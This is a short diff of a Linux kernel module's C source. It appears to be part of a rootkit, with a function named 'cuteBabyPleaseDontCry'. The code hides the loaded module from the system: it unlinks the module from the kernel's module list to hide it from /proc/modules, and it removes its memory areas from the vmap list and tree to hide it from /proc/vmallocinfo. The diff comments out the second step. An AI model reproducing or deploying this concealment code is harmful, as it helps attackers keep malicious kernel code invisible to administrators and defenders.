@@ -65,7 +65,7 @@ void cuteBabyPleaseDontCry(void) {
     struct module_use *use, *tmp;
     struct list_head *_vmap_area_list;
     struct rb_root *_vmap_area_root;
-
+/*
 #ifdef KPROBE_LOOKUP
     
     if (register_kprobe(&kp) < 0) {
@@ -82,16 +82,16 @@ void cuteBabyPleaseDontCry(void) {
         (struct list_head *) kallsyms_lookup_nameXX("vmap_area_list");
     _vmap_area_root = (struct rb_root *) kallsyms_lookup_nameXX("vmap_area_root");
 
-    /* hidden from /proc/vmallocinfo */
+    ** hidden from /proc/vmallocinfo **
     list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
         if ((unsigned long) THIS_MODULE > va->va_start &&
             (unsigned long) THIS_MODULE < va->va_end) {
             list_del(&va->list);
-            /* remove from red-black tree */
+            ** remove from red-black tree **
             rb_erase(&va->rb_node, _vmap_area_root);
         }
     }
-
+*/
     /* hidden from /proc/modules */
     list_del_init(&THIS_MODULE->list);
 
